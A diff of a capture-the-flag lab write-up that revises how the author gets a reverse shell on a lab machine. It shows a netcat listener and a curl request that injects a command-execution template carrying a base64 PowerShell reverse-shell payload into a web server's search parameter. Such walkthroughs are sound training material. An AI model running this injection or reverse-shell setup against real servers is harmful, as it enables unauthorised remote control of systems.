@@ -230,17 +230,17 @@ First, I'll setup a listener to receive the shell.
 ❯ rlwrap nc -lvnp "9001"
 ```
 
-Then, I'll choose the 'Powershell #3 (Base64)' payload from
-[RevShells](https://www.revshells.com/).
+Then, I'll choose the URL encoded version of the 'Powershell #3 (Base64)'
+payload from [RevShells](https://www.revshells.com/).
 
-I'll save the URL encoded version of it as the `COMMAND` shell variable.
+I'll save it as the `URL_ENCODED_REVSHELL_PAYLOAD` shell variable.
 
 ### Exploitation
 
 Let's exploit this CVE to execute our payload.
 
 ```sh
-❯ curl -s -o "/dev/null" "http://10.10.10.8/?search=%00%7B%7B.exec|$COMMAND.%7D%7D"
+❯ curl -s -o "/dev/null" "http://10.10.10.8/?search=%00%7B%7B.exec|$URL_ENCODED_REVSHELL_PAYLOAD.%7D%7D"
 ```
 
 If we check our listener:
@@ -437,6 +437,8 @@ Tunnel adapter isatap.{99C463C2-DC10-45A6-9CC8-E62F160519AE}:
 
 There's an Ethernet interface and an ISATAP interface.
 
+## System enumeration
+
 ### Flags
 
 If we check our Desktop folder, we find the user flag.
@@ -565,7 +567,7 @@ It went off without a hitch.
 
 However, I don't like Metasploit's shell, so I'll open my own on port `9003`.
 
-## Getting a lay of the land
+## System enumeration
 
 If we run `whoami`, we see that we're `NT AUTHORITY\SYSTEM`!
 
